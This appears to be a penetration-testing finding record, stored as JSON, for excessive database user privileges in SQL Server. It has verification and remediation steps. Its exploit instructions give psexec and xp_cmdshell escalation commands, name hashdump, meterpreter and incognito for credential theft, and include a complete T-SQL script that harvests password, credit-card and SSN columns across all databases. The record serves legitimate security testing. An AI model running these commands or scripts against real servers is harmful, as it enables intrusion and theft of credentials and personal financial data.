{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":690117,"exploitInstructions":"[escalation from local admin to sysadmin in sql server 2k8 and 2k12]<br>- get a cmd shell and use osql:    <br>- - psexec -s -i cmd <br>-- osql -E -S .\\sqlexpress -Q \"select is_srvrolemember('sysadmin')\"<br>-get management gui<br>-- psexec -s -i ssms<br><br><br>[Check for shared service accounts, and sql express instances with the builtin\\users group]<br>Follow standard windows escalation, and database crawling techniques.<br><br>#1 - Verify local systems access with xp_cmdshell<br>#2 - Determine if service account is domain admin<br>#3 - Escalate locally using 'run hashdump', cachdump, rainbow tables, meterpreter psexec module, and incognito<br>#4 - Crawl databases with domain admin that has dbadmin priv, or shared service account using the following script<br><br>-- note: Enumerate databases that use a shared <br>-- SQL Server service accounts via xp_cmdshell and osql.  <br>-- You can open data_servers.txt to get list. - Note: you can specifiy a username and password if need with -u and -p switches, but remember to remove -E if you do that<br><br>EXEC master..xp_cmdshell 'FOR /F %a IN (''osql -L'') DO osql ?E ?S %a ?Q \"select @@Servername as Server_Name\" -h-1 -s \",\" -w500 >> database_servers.txt';<br><br><br><br>#5 - Find senstive data on each server with the script below - Note: this can be wrapped in the previous script<br><br>/*<br> -------------------------------------------------<br> Cursor1 <br> Enumerate columns from each database that <br> contain keywords and write them to a temp table<br> -------------------------------------------------<br>*/<br>DECLARE @var1 varchar(max)<br>DECLARE @var2 varchar(max)<br>DECLARE @var3 varchar(max)<br>DECLARE @var4 varchar(max)<br>DECLARE MY_CURSOR CURSOR<br>FOR<br><br>SELECT name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')<br><br>OPEN MY_CURSOR<br>FETCH NEXT FROM MY_CURSOR INTO @var1<br>WHILE @@FETCH_STATUS = 0   <br>BEGIN  <br><br>SET @var2 = ' <br>USE master<br>IF OBJECT_ID(''tempdb..##mytable'') IS NULL <br>BEGIN <br>CREATE TABLE ##mytable (<br>server_name varchar(MAX),<br>database_name varchar(MAX),<br>table_name varchar(MAX),<br>column_name varchar(MAX)<br>) <br>END <br>INSERT INTO ##mytable<br>SELECT @@SERVERNAME as SERVER_NAME,TABLE_CATALOG as DATABASE_NAME,TABLE_NAME,COLUMN_NAME <br>FROM '+@var1+'.INFORMATION_SCHEMA.COLUMNS WHERE <br>COLUMN_NAME like ''%pwd%'' or <br>COLUMN_NAME like ''%pass%'' or <br>COLUMN_NAME like ''%ccn%'' or <br>COLUMN_NAME like ''%credit%'' or <br>COLUMN_NAME like ''%card%'' or<br>COLUMN_NAME like ''%ssn%'' or <br>COLUMN_NAME like ''%social%''<br>'<br>EXEC(@var2);<br><br>FETCH NEXT FROM MY_CURSOR INTO @var1<br><br>END   <br>CLOSE MY_CURSOR<br>DEALLOCATE MY_CURSOR<br><br>/*<br> -------------------------------------------------<br> Cursor2<br> Take a 5 record sample from each potential <br> column<br> Note: This will not return any empty tables.<br> -------------------------------------------------<br>*/<br>DECLARE @var_server varchar(max)<br>DECLARE @var_database varchar(max)<br>DECLARE @var_table varchar(max)<br>DECLARE @var_column varchar(max)<br>DECLARE @myquery varchar(max)<br>DECLARE MY_CURSOR CURSOR<br>FOR<br><br>SELECT server_name,database_name,table_name,column_name FROM ##mytable<br><br>OPEN MY_CURSOR<br>FETCH NEXT FROM MY_CURSOR INTO @var_server,@var_database,@var_table,@var_column<br>WHILE @@FETCH_STATUS = 0   <br>BEGIN  <br><br>SET @myquery = ' <br>USE master<br>IF OBJECT_ID(''tempdb..##mytable2'') IS NULL <br>BEGIN <br>CREATE TABLE ##mytable2 (<br>server_name varchar(MAX),<br>database_name varchar(MAX),<br>table_name varchar(MAX),<br>column_name varchar(MAX),<br>column_value varchar(MAX)<br>) <br>END <br>INSERT INTO ##mytable2 (server_name,database_name,table_name,column_name,column_value)<br>SELECT TOP 5 '''+@var_server+''' as server_name,'''+@var_database+''' as database_name,''<br>'+@var_table+''' as table_name,'''+@var_column+''' as comlumn_name,'+@var_column+'<br>FROM '+@var_database+'..'+@var_table+' WHERE '+@var_column+' IS NOT NULL'<br>EXEC(@myquery);<br><br>FETCH NEXT FROM MY_CURSOR INTO @var_server,@var_database,@var_table,@var_column<br><br>END   <br>CLOSE MY_CURSOR<br>DEALLOCATE MY_CURSOR<br><br>select * from ##mytable2<br><br>DROP TABLE","verificationInstructions":"Two tests (three if access directly on the internal network<br>1- Check if the current application database user has the syadmin fixed server role<br>2- Check if the current application database user has access to other databases<br>3- Check if the current application database user has access to dangerous functions - Only perform this test if the database is accessible directly via the internal network.<br><br><br><ol><li>1 - Check if the current application database user has the syadmin fixed server role</li><br></ol><br><br>select is_srvrolemember('sysadmin')<br><br><ol><li>2 Check if the current application database user has access to other databases</li><br></ol><br><br>--The command below will provide a list of all of the databases,tables,and columns on the database server<br>sp_msforeachdb 'select TABLE_CATALOG as DATABASE_NAME,TABLE_NAME,COLUMN_NAME from DB_DBworm.INFORMATION_SCHEMA.COLUMNS'<br><br>--The command below will allow you  to select data from identified tables and tables.<br>select &#42; from &lt;db&gt;..&lt;tablename&gt;<br><br><ol><li>3- Check if the current application database user has access to dangerous functions - Only perform this test if the database is accessible directly via the internal network.</li><br></ol><br><br>Run SCUBA against the remote database server to identify additional configuration issues.  http://www.imperva.com/products/dle_downloads-and-evaluations-overview.html<br>","remediationInstructions":"Use the principle of least privilege when configuring database user accounts. Only provide database users with the privileges necessary to perform functions associated with their role.<br><br>Do not provide database users with privileges that allow them to directly access the database.  Create a set of procedures that can be used to perform all of the functions necessary for the role.  Once they have been created, only provide the user with execute permissions to those procedures.  This will allow the user to perform necessary functions while ensuring they do not have excessive privileges to the database.<br>","name":"Excessive Privileges - Database User","sourceId":"M:690117","severity":"Medium","businessImpact":"Excessive privileges on the database account used by the application may allow provide a threat agent with the means to gain unauthorized access to sensitive information and database functionality.  In the event of an incident revenue could be loss due to brand damage, fines, and penalties.","description":"At least one database user was discovered that has been configured with excessive privileges.<br>"}}}